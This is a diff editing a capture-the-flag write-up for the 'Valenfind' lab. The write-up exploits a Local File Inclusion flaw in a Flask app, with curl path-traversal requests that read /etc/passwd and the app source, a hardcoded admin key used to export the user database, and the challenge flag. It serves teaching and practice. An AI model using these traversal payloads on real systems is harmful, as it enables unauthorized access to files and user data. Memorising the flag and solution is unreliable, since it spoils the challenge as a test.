@@ -2,13 +2,12 @@
 
 ## 📝 Challenge Overview
 
-**Valenfind** is a fictional dating application with a hidden vulnerability.  
-Your goal is to find the **flag** hidden within the system.  
+**Valenfind** is a fictional dating application intentionally designed with a hidden vulnerability.  
+Your mission is to identify and extract the **flag** hidden within the system.  
 
-The app was accessible at:  
+The app is accessible at:  
 
-http://10.49.158.106:5000
-
+[http://10.49.158.106:5000](http://10.49.158.106:5000)  
 
 ---
 
@@ -16,13 +15,13 @@ http://10.49.158.106:5000
 
 ### 1. What is LFI (Local File Inclusion)?
 
-**Local File Inclusion (LFI)** is a web security vulnerability that allows an attacker to include files on a server through the web browser.  
-It usually happens when a web application **uses user input to dynamically load files** without proper validation.  
+**Local File Inclusion (LFI)** is a web security flaw that allows an attacker to include and read files on a server through a web application.  
+It usually occurs when a web app **directly uses user input to access files** without proper validation.  
 
 **Why LFI is dangerous:**
-- Attackers can read sensitive files such as `/etc/passwd` or configuration files.
-- It may expose source code or secrets (like API keys or passwords).
-- Can lead to full system compromise if combined with other vulnerabilities.
+- Can expose sensitive files like `/etc/passwd` or configuration files.  
+- May reveal source code, API keys, or passwords.  
+- Can lead to full server compromise when chained with other vulnerabilities.  
 
 **Example in this app:**
 
@@ -33,11 +32,10 @@ def fetch_layout():
     file_path = os.path.join(os.getcwd(), 'templates', 'components', layout_file)
     with open(file_path, 'r') as f:
         return f.read()
-Here, the layout parameter is directly used to access files.
-No proper sanitization → any file on the system can be read.
+Here, the layout parameter is directly used to access files, without sanitization → allows reading arbitrary files on the system.
 
-2. Python Server Vulnerability
-The Flask server had multiple issues:
+2. Python Server Vulnerabilities
+The Flask server contains multiple security issues:
 
 Hardcoded secrets:
 
@@ -45,7 +43,7 @@ ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
 Hardcoding API keys is dangerous because once discovered, attackers can access privileged endpoints.
 
 Unrestricted file read via LFI:
-The fetch_layout route allowed reading sensitive files outside the intended templates folder.
+The /api/fetch_layout route allows reading files outside the intended templates folder.
 
 Database exposure endpoint:
 
@@ -54,15 +52,15 @@ With the admin key, anyone could download the full SQLite database containing us
 
 🛠 Step-by-Step Solution
 Step 1: Test for LFI
-Try fetching a system file:
+Fetch a system file to confirm vulnerability:
 
 curl "http://10.49.158.106:5000/api/fetch_layout?layout=../../../../etc/passwd"
-✅ You should see contents like:
+✅ Expected output:
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin/nologin
 ...
-This confirms LFI vulnerability.
+This confirms LFI is present.
 
 Step 2: Fetch Application Source Code
 curl "http://10.49.158.106:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py"
@@ -72,7 +70,7 @@ ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
 
 Database path: cupid.db
 
-/api/admin/export_db endpoint for downloading the database.
+Admin export endpoint: /api/admin/export_db
 
 Step 3: Export the Database
 Use the admin key to download the database:
@@ -86,7 +84,7 @@ sqlite3 valenfind.db
 Check tables:
 
 .tables
-Query users:
+Query the users table:
 
 select * from users;
 Step 5: Locate the Flag
@@ -96,15 +94,15 @@ FLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
 ✅ That’s the final flag.
 
 ⚡ Lessons Learned
-Never trust user input – sanitize any file paths to prevent LFI.
+Never trust user input – always sanitize file paths to prevent LFI.
 
-Do not hardcode secrets – store them securely outside source code.
+Do not hardcode secrets – store keys securely outside source code.
 
-Secure admin endpoints – always require authentication and limit access.
+Secure admin endpoints – require authentication and limit access.
 
-Database safety – never expose databases to the public directly.
+Database safety – avoid exposing databases directly to the public.
 
-Audit code for dynamic file access – any dynamic open() or template load can be exploited.
+Audit code for dynamic file access – open() or template loading can be exploited.
 
 🏁 Conclusion
 This challenge demonstrates:
@@ -120,3 +118,4 @@ Flag:
 THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
 
 ---
+
